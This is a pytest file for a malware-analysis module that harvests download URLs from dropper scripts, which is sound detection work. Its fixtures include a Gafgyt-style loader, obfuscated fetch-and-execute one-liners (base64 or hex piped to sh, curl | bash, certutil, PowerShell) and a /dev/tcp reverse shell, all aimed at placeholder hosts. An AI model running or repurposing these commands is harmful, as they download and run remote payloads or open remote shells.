"""Download-command harvesting (no AssemblyLine runtime)."""

import re
from urllib.parse import urlparse

import pytest

from dropperurls.analysis import (
    DECODED,
    LITERAL,
    MAX_EXPANSIONS_PER_LINE,
    RAW_TCP,
    SCHEMELESS,
    VARIABLE,
    behaviour_flags,
    expand,
    find_downloads,
    harvest,
    host_of,
    is_http,
    multi_stage,
    variable_values,
)

IP = "198.51.100.61"
NAMES = ["7007c2", "414b84", "f73a42", "4ec6b1", "908942", "0a7340",
         "105c31", "fac127", "e6e1b3", "30519e", "c8c36b", "4e1b69"]
# The shape of a real Gafgyt multi-architecture loader.
GAFGYT = ("#!/bin/bash\n" + "\n".join(
    f"wget http://{IP}/{n}; curl -O http://{IP}/{n}; chmod 777 {n}; ./{n} bc; rm -rf {n}; rm -rf {n}.1"
    for n in NAMES) + "\n").encode()

EDGE = b"""#!/bin/sh
busybox wget http://192.0.2.19:8080/arm7 -O - > arm7
tftp -g -r mips.bin 192.0.2.5
tftp 192.0.2.6 -c get sh4.bin
curl --silent https://cdn.example.net/stage2.elf -o s2
certutil -urlcache -split -f http://198.51.100.4/a.exe
powershell -c "IWR http://203.0.113.9/p.ps1 -OutFile p.ps1"
echo "http://not-a-download.example.com/ignored"
# curl http://commented-out.example.org/x
"""


def test_gafgyt_loader_urls():
    found, tools = harvest(GAFGYT)
    assert len(found) == 12
    assert all(urlparse(u).hostname == IP for u in found)
    assert all(re.fullmatch(r"/[0-9a-f]{6}", urlparse(u).path) for u in found)  # extensionless paths kept
    assert all({"wget", "curl"} <= cmds for cmds in found.values())
    assert not any(u.endswith((";", ",", "'", '"')) for u in found)
    assert tools == {"wget", "curl"}


def test_gafgyt_loader_behaviour():
    assert behaviour_flags(GAFGYT) == {"chmod": True, "chmod_777": True, "exec_local": True, "self_delete": True}


@pytest.mark.parametrize("url", [
    "http://192.0.2.19:8080/arm7",          # busybox wget with a port
    "tftp://192.0.2.5/mips.bin",              # tftp -g -r: no URL in the script, synthesised
    "tftp://192.0.2.6/sh4.bin",               # tftp <host> -c get
    "https://cdn.example.net/stage2.elf",
    "http://198.51.100.4/a.exe",             # certutil
    "http://203.0.113.9/p.ps1",              # PowerShell IWR
    "http://commented-out.example.org/x",    # commented-out download commands count by design
])
def test_edge_cases_are_harvested(url):
    assert url in harvest(EDGE)[0]


def test_url_without_a_download_command_is_ignored():
    assert "http://not-a-download.example.com/ignored" not in harvest(EDGE)[0]


def test_benign_script_yields_nothing():
    assert harvest(b"#!/bin/sh\necho hello\nls -la /tmp\ncat /etc/hostname\n") == ({}, set())


def test_urls_keep_first_appearance_order():
    found, _ = harvest(b"wget http://b.example/2\ncurl http://a.example/1\nwget http://b.example/2\n")
    assert list(found) == ["http://b.example/2", "http://a.example/1"]


@pytest.mark.parametrize("url,expected", [
    (f"http://{IP}/x", (IP, True)), ("https://cdn.example.net/a", ("cdn.example.net", False)),
    ("http:///nohost", (None, False)), ("http://[::1/bad", (None, False)),
])
def test_host_of(url, expected):
    assert host_of(url) == expected


@pytest.mark.parametrize(
    "url,expected", [("http://x", True), ("HTTPS://x", True), ("tftp://x/y", False), ("ftp://x", False)]
)
def test_is_http(url, expected):
    assert is_http(url) is expected


@pytest.mark.parametrize("script,flags", [
    (b"chmod +x a; ./a", {"chmod": True, "chmod_777": False, "exec_local": True, "self_delete": False}),
    (b"rm -f a", {"chmod": False, "chmod_777": False, "exec_local": False, "self_delete": True}),
])
def test_behaviour_flags_individually(script, flags):
    assert behaviour_flags(script) == flags


# ---- find_downloads: variables, encodings, raw sockets --------------------------------------

ARCH_LOADER = b"""CB=http://198.51.100.70
case "$(uname -m)" in
  aarch64|arm64) BIN=sysmon-arm.gz ;;
  *) BIN=sysmon.gz ;;
esac
wget -q -O "$D/.r" "$CB/$BIN"
python3 -c "import urllib.request;urllib.request.urlopen('$CB/$BIN')"
"""


def downloads(script: bytes) -> dict[str, tuple[str, bool]]:
    return {url: (d.how, d.fetchable) for url, d in find_downloads(script)[0].items()}


def test_variables_resolve_per_case_branch():
    found, tools = find_downloads(ARCH_LOADER)
    assert {u: d.how for u, d in found.items()} == {
        "http://198.51.100.70/sysmon-arm.gz": VARIABLE, "http://198.51.100.70/sysmon.gz": VARIABLE}
    assert all(d.commands == {"wget", "urlopen"} for d in found.values())  # the Python fallback counts too
    assert tools == {"wget", "urlopen"}


@pytest.mark.parametrize("script,url,how", [
    (b"wget ${HOST:-http://198.51.100.9}/x.sh\n", "http://198.51.100.9/x.sh", VARIABLE),
    (b'URL=http://198.51.100.13/z.sh wget "$URL"\n',
     "http://198.51.100.13/z.sh", LITERAL),  # assignment line holds the URL
    (b'export U="http://198.51.100.15"\ncurl -fsSL $U/i.sh | sh\n', "http://198.51.100.15/i.sh", VARIABLE),
    (b"wget${IFS}http://198.51.100.3/a.sh\n", "http://198.51.100.3/a.sh", LITERAL),
    (b"wget $(echo aHR0cDovLzE5OC41MS4xMDAuNC9iLnNo | base64 -d)\n", "http://198.51.100.4/b.sh", DECODED),
    (b"curl $(printf '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x39\\x38\\x2e"
     b"\\x35\\x31\\x2e\\x31\\x30\\x30\\x2e\\x35\\x2f\\x63')\n",
     "http://198.51.100.5/c", DECODED),
    (b"wget $'\\x68ttp://198.51.100.6/d'\n", "http://198.51.100.6/d", DECODED),
    (b"echo d2dldCBodHRwOi8vMTk4LjUxLjEwMC43L2Uuc2ggLU8tIHwgc2g= | base64 -d | sh\n",
     "http://198.51.100.7/e.sh", DECODED),
    (b"wget 198.51.100.8/f\n", "http://198.51.100.8/f", SCHEMELESS),
    (b"busybox wget 198.51.100.8:8080/g\n", "http://198.51.100.8:8080/g", SCHEMELESS),
    (b'exec 3<>/dev/tcp/198.51.100.10/80\necho -e "GET /h HTTP/1.0\\r\\n\\r\\n" >&3\n',
     "http://198.51.100.10/h", RAW_TCP),
    (b'exec 3<>/dev/tcp/198.51.100.10/8080\nprintf "GET /h HTTP/1.1\\r\\n" >&3\n',
     "http://198.51.100.10:8080/h", RAW_TCP),
])
def test_each_technique(script, url, how):
    assert downloads(script).get(url) == (how, True)


def test_reverse_shell_is_not_a_download():
    assert downloads(b"bash -i >& /dev/tcp/198.51.100.11/4444 0>&1\n") == {}


def test_scheme_is_only_added_on_download_lines():
    assert downloads(b"echo 198.51.100.8/f\nping 198.51.100.8\n") == {}


def test_unresolved_variables_are_never_invented():
    found = downloads(b'wget "$URL/x"\nwget -O- http://198.51.100.12/$(uname -m)\n')
    # The literal URL is still reported (its host is an indicator) but is not fetchable.
    assert found == {"http://198.51.100.12/$(uname": (LITERAL, False)}


def test_literal_urls_keep_their_previous_behaviour():
    found, _ = find_downloads(GAFGYT)
    assert set(found) == set(harvest(GAFGYT)[0]) and all(d.how == LITERAL for d in found.values())


def test_expansion_is_bounded():
    values = variable_values(b"".join(b"A=v%d\n" % i for i in range(20)) + b"".join(b"B=w%d\n" % i for i in range(20)))
    assert len(values[b"A"]) == 8
    assert len(expand(b"wget http://x/$A/$B/$A", values)) == MAX_EXPANSIONS_PER_LINE


def test_decoding_depth_is_bounded():
    import base64
    script = b"wget http://198.51.100.20/deep\n"
    for _ in range(4):
        script = b"echo " + base64.b64encode(script) + b" | base64 -d | sh\n"
    assert "http://198.51.100.20/deep" not in downloads(script)  # four layers exceed the two-layer limit


@pytest.mark.parametrize("script,url", [
    # The shell drops a backslash before an ordinary character: the real hosts are c2.example.net / dl.example.org.
    (b"curl -fsSL http://c2.ex\\am\\ple.net/x/run.sh | bash\n", "http://c2.example.net/x/run.sh"),
    (b"echo Y3VybCAtZnNTTCBodHRwOi8vZGwuXGV4XGFtcGxlLm9yZy94L3J1bi5zaAo=|base64 -d|bash\n",
     "http://dl.example.org/x/run.sh"),
])
def test_backslashes_inserted_into_urls_are_removed(script, url):
    found = downloads(script)
    assert found == {url: (DECODED, True)}  # and no cut-off fragment like http://c2.ex


def test_a_real_trailing_escape_still_ends_the_url():
    found = downloads(b'echo -e "wget http://198.51.100.1/a\\n" > run.sh\n')
    assert found == {"http://198.51.100.1/a": (LITERAL, True)}


@pytest.mark.parametrize("script", [
    # sed patterns that escape slashes: legitimate, not evasion (both from real system scripts)
    b"FINAL_URL=\"$(grep OK t | sed -n 's/.*\\:\\([0-9]\\+\\).*/https:\\/\\/pastebin.ca\\/\\1/p')\"\nwget -q https://www.pastebin.ca/x\n",
    b"PWFILTER='s/\\(ftp:\\/\\/.*\\):.*@/\\1:*******@/g'\nftp -n host\n",
])
def test_sed_patterns_are_not_evasion(script):
    assert not any(d.how == DECODED for d in find_downloads(script)[0].values())
    assert "ftp://.*" not in find_downloads(script)[0]


def test_one_stray_backslash_is_not_enough():
    found = downloads(b"curl http://a.example/x\\y.sh | sh\n")
    assert not any(how == DECODED for how, _ in found.values())


def test_urls_need_a_real_host():
    assert downloads(b"curl ftp://.* | sh\ncurl http://-bad/x\n") == {}


@pytest.mark.parametrize("name,script", [
    ("whitespace steganography", b"$_=<<'';y;\\r\\n;;d;\n" + b" \t  \t\t \n" * 20000),
    ("one huge whitespace line", b" " * 200000 + b"\n"),
    ("many semicolons", b";" * 200000),
    ("repeated download words", b"wget " * 40000),
    ("repeated assignments", b"A=" * 100000),
    ("repeated schemes", b"wget http://" * 20000),
    ("repeated dev tcp", b"/dev/tcp/198.51.100.4/80\n" * 20000),
    ("repeated variables", b"wget http://h/$A$A$A$A$A$A$A$A\n" * 5000),
])
def test_pathological_files_are_analysed_quickly(name, script):
    import time
    start = time.monotonic()
    find_downloads(script)
    assert time.monotonic() - start < 5, name


@pytest.mark.parametrize("urls,expected", [
    # one payload per architecture on a bare IP: the loader pattern
    (["http://198.51.100.9/x86", "http://198.51.100.9/arm7", "http://198.51.100.9/mips"], ("198.51.100.9", "", 3)),
    # a domain with extensionless names counts too
    (["http://c2.example/a/x86", "http://c2.example/a/arm", "http://c2.example/a/mips"], ("c2.example", "/a", 3)),
    # an IP host counts even when the payloads have extensions
    (["http://198.51.100.9/a.sh", "http://198.51.100.9/b.sh", "http://198.51.100.9/c.sh"], ("198.51.100.9", "", 3)),
    # an installer: ordinary extensions on a domain
    (["https://dl.example/linux/a.gpg", "https://dl.example/linux/b.gpg", "https://dl.example/linux/c.deb"], None),
    # several hosts, none with three
    (["http://a.example/x", "http://b.example/x", "http://c.example/x"], None),
    # same host but different directories
    (["http://dl.example/a/x", "http://dl.example/b/x", "http://dl.example/c/x"], None),
    (["http://198.51.100.9/x", "http://198.51.100.9/y"], None),
    ([], None),
])
def test_multi_stage(urls, expected):
    assert multi_stage(urls) == expected
